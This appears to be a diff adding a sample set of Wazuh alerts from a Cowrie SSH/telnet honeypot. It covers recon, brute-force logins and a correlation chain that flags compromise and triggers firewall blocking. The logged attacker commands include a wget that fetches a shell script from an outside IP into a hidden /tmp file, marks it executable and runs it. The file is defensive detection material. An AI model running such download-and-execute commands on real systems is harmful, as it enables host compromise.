@@ -1,0 +1,297 @@
+[
+  {
+    "timestamp": "2026-11-07T15:44:13.963+0000",
+    "rule": {
+      "level": 3,
+      "description": "Cowrie: New connection to honeypot from 130.0.47.214",
+      "id": "100100",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", "recon"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794066253.14164",
+    "full_log": "{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"130.0.47.214\",\"src_port\":52986,\"dst_ip\":\"172.19.0.2\",\"dst_port\":23,\"session\":\"24d7a96f1363\",\"protocol\":\"telnet\",\"message\":\"New connection: 130.0.47.214:52986 (172.19.0.2:23) [session: 24d7a96f1363]\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T15:44:13.146429Z\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "telnet",
+      "eventid": "cowrie.session.connect",
+      "src_ip": "130.0.47.214",
+      "src_port": "52986",
+      "dst_ip": "172.19.0.2",
+      "dst_port": "23",
+      "session": "24d7a96f1363",
+      "message": "New connection: 130.0.47.214:52986 (172.19.0.2:23) [session: 24d7a96f1363]",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T15:44:13.146429Z"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T15:52:33.459+0000",
+    "rule": {
+      "level": 5,
+      "description": "Cowrie: Failed login attempt from 34.158.96.157 - user: dragos_iugabrad",
+      "id": "100101",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", "authentication_failed"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794066753.6519736",
+    "full_log": "{\"eventid\":\"cowrie.login.failed\",\"username\":\"dragos_iugabrad\",\"password\":\"Dragos@123\",\"message\":\"login attempt [dragos_iugabrad/Dragos@123] failed\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T15:52:32.898796Z\",\"src_ip\":\"34.158.96.157\",\"session\":\"9494cd54ba21\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.login.failed",
+      "username": "dragos_iugabrad",
+      "password": "Dragos@123",
+      "message": "login attempt [dragos_iugabrad/Dragos@123] failed",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T15:52:32.898796Z",
+      "src_ip": "34.158.96.157",
+      "session": "9494cd54ba21"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T17:12:50.151+0000",
+    "rule": {
+      "level": 7,
+      "description": "Cowrie: Successful login from 109.160.32.150 - user: test",
+      "id": "100102",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", "authentication_success"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794071570.51730152",
+    "full_log": "{\"eventid\":\"cowrie.login.success\",\"username\":\"test\",\"password\":\"test@12345\",\"message\":\"login attempt [test/test@12345] succeeded\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T17:12:49.580776Z\",\"src_ip\":\"109.160.32.150\",\"session\":\"3a3d086c329a\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.login.success",
+      "username": "test",
+      "password": "test@12345",
+      "message": "login attempt [test/test@12345] succeeded",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T17:12:49.580776Z",
+      "src_ip": "109.160.32.150",
+      "session": "3a3d086c329a"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T17:12:52.154+0000",
+    "rule": {
+      "level": 8,
+      "description": "Cowrie: Command executed by attacker from 109.160.32.150: uname -s -v -n -r -m",
+      "id": "100103",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", "attack"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794071572.51747505",
+    "full_log": "{\"eventid\":\"cowrie.command.input\",\"input\":\"uname -s -v -n -r -m\",\"message\":\"CMD: uname -s -v -n -r -m\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T17:12:50.595768Z\",\"src_ip\":\"109.160.32.150\",\"session\":\"3a3d086c329a\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.command.input",
+      "input": "uname -s -v -n -r -m",
+      "message": "CMD: uname -s -v -n -r -m",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T17:12:50.595768Z",
+      "src_ip": "109.160.32.150",
+      "session": "3a3d086c329a"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T17:51:15.043+0000",
+    "rule": {
+      "level": 12,
+      "description": "Cowrie: File download/write detected from 86.123.132.219",
+      "id": "100104",
+      "firedtimes": 1,
+      "mail": true,
+      "groups": ["local", "cowrie", "cowrie", "attack", "persistence"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794073875.80709728",
+    "full_log": "{\"eventid\":\"cowrie.session.file_download\",\"url\":\"http://185.199.108.133/malware_test.sh\",\"outfile\":\"/home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"shasum\":\"70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T17:51:13.448655Z\",\"message\":\"Downloaded URL (http://185.199.108.133/malware_test.sh) with SHA-256 70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3 to /home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"src_ip\":\"86.123.132.219\",\"session\":\"75ae6c42536c\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "url": "http://185.199.108.133/malware_test.sh",
+      "eventid": "cowrie.session.file_download",
+      "outfile": "/home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "shasum": "70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T17:51:13.448655Z",
+      "message": "Downloaded URL (http://185.199.108.133/malware_test.sh) with SHA-256 70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3 to /home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "src_ip": "86.123.132.219",
+      "session": "75ae6c42536c"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T15:44:27.986+0000",
+    "rule": {
+      "level": 3,
+      "description": "Cowrie: Session closed from 130.0.47.214",
+      "id": "100105",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", "recon"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794066267.15728",
+    "full_log": "{\"eventid\":\"cowrie.session.closed\",\"duration\":14.079340934753418,\"message\":\"Connection lost after 14 seconds\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T15:44:27.225447Z\",\"src_ip\":\"130.0.47.214\",\"session\":\"24d7a96f1363\",\"protocol\":\"telnet\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "telnet",
+      "eventid": "cowrie.session.closed",
+      "duration": "14.079341",
+      "message": "Connection lost after 14 seconds",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T15:44:27.225447Z",
+      "src_ip": "130.0.47.214",
+      "session": "24d7a96f1363"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T18:12:31.810+0000",
+    "rule": {
+      "level": 10,
+      "description": "Cowrie: Brute-force attack from 109.160.32.150 ",
+      "id": "100106",
+      "frequency": 10,
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie", "cowrie", " brute_force", " attack", " authentication_failed", "  "]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794075151.92900966",
+    "full_log": "{\"eventid\":\"cowrie.login.failed\",\"username\":\"tpc\",\"password\":\"Aaaa1111\",\"message\":\"login attempt [tpc/Aaaa1111] failed\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T18:12:31.012461Z\",\"src_ip\":\"109.160.32.150\",\"session\":\"86990c053f37\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.login.failed",
+      "username": "tpc",
+      "password": "Aaaa1111",
+      "message": "login attempt [tpc/Aaaa1111] failed",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T18:12:31.012461Z",
+      "src_ip": "109.160.32.150",
+      "session": "86990c053f37"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json",
+    "note": "firedtimes=1 but frequency=10 - this rule's description lists the 10 prior login.failed events (see 'previous_output' in the raw alert) that fell within the 60s window, correlated by same_field(src_ip) against rule 100101"
+  },
+  {
+    "timestamp": "2026-11-07T17:51:13.446+0000",
+    "rule": {
+      "level": 13,
+      "description": "Cowrie: Dangerous/malware-like command ran by 86.123.132.219: wget http://185.199.108.133/malware_test.sh -O /tmp/.x 2>/dev/null; chmod +x /tmp/.x",
+      "id": "100107",
+      "firedtimes": 1,
+      "mail": true,
+      "groups": ["local", "cowrie", "cowrie", "attack", "malware_behavior"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794073873.80701913",
+    "full_log": "{\"eventid\":\"cowrie.command.input\",\"input\":\"wget http://185.199.108.133/malware_test.sh -O /tmp/.x 2>/dev/null; chmod +x /tmp/.x\",\"message\":\"CMD: wget http://185.199.108.133/malware_test.sh -O /tmp/.x 2>/dev/null; chmod +x /tmp/.x\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T17:51:13.265690Z\",\"src_ip\":\"86.123.132.219\",\"session\":\"75ae6c42536c\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.command.input",
+      "input": "wget http://185.199.108.133/malware_test.sh -O /tmp/.x 2>/dev/null; chmod +x /tmp/.x",
+      "message": "CMD: wget http://185.199.108.133/malware_test.sh -O /tmp/.x 2>/dev/null; chmod +x /tmp/.x",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T17:51:13.265690Z",
+      "src_ip": "86.123.132.219",
+      "session": "75ae6c42536c"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json"
+  },
+  {
+    "timestamp": "2026-11-07T18:18:30.670+0000",
+    "rule": {
+      "level": 0,
+      "description": "Cowrie: File downloaded succesfully after malicious command. Corelation rule ",
+      "id": "100108",
+      "frequency": 2,
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["local", "cowrie"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794075510.96149371",
+    "full_log": "{\"eventid\":\"cowrie.session.file_download\",\"url\":\"http://185.199.108.133/malware_test.sh\",\"outfile\":\"/home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"shasum\":\"70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T18:18:28.787948Z\",\"message\":\"Downloaded URL (http://185.199.108.133/malware_test.sh) with SHA-256 70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3 to /home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3\",\"src_ip\":\"86.123.132.219\",\"session\":\"64bb5b06ac70\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "url": "http://185.199.108.133/malware_test.sh",
+      "eventid": "cowrie.session.file_download",
+      "outfile": "/home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "shasum": "70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T18:18:28.787948Z",
+      "message": "Downloaded URL (http://185.199.108.133/malware_test.sh) with SHA-256 70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3 to /home/cowrie/cowrie/dl/70d613e3acfba24fd2876fcbacaf639e1e111ef4d54baf70761c47673f37d6a3",
+      "src_ip": "86.123.132.219",
+      "session": "64bb5b06ac70"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json",
+    "note": "level 0 by design - silent correlation marker, does not generate a visible alert or email, only feeds the next stage (100109)"
+  },
+  {
+    "timestamp": "2026-11-07T18:18:34.696+0000",
+    "rule": {
+      "level": 15,
+      "description": "Cowrie: System possibly compromised!, attacker 86.123.132.219 downloaded a file and ran a malware specific command.",
+      "id": "100109",
+      "frequency": 2,
+      "firedtimes": 1,
+      "mail": true,
+      "groups": ["local", "cowrie", "cowrie", "attack", "malware_behaviour", "compromised"]
+    },
+    "agent": { "id": "001", "name": "Honeypot", "ip": "10.154.0.2" },
+    "manager": { "name": "instance-20260901-145451" },
+    "id": "1794075514.96188766",
+    "full_log": "{\"eventid\":\"cowrie.command.input\",\"input\":\"chmod +x /tmp/.x && /tmp/.x\",\"message\":\"CMD: chmod +x /tmp/.x && /tmp/.x\",\"sensor\":\"6f5861fbc49d\",\"uuid\":\"f1c69a29-dac1-11f1-b0bf-fada110b29d7\",\"timestamp\":\"2026-11-07T18:18:34.659203Z\",\"src_ip\":\"86.123.132.219\",\"session\":\"449c2f572d31\",\"protocol\":\"ssh\"}",
+    "decoder": { "name": "json" },
+    "data": {
+      "protocol": "ssh",
+      "eventid": "cowrie.command.input",
+      "input": "chmod +x /tmp/.x && /tmp/.x",
+      "message": "CMD: chmod +x /tmp/.x && /tmp/.x",
+      "sensor": "6f5861fbc49d",
+      "uuid": "f1c69a29-dac1-11f1-b0bf-fada110b29d7",
+      "timestamp": "2026-11-07T18:18:34.659203Z",
+      "src_ip": "86.123.132.219",
+      "session": "449c2f572d31"
+    },
+    "location": "/home/dragos_iugabrad/tpotce/data/cowrie/log/cowrie.json",
+    "note": "Maximum severity. This alert, plus 100108 firing 2 seconds earlier for the same src_ip, is what triggers Active Response (firewall-drop) - see wazuh-config/active-response.xml"
+  }
+]
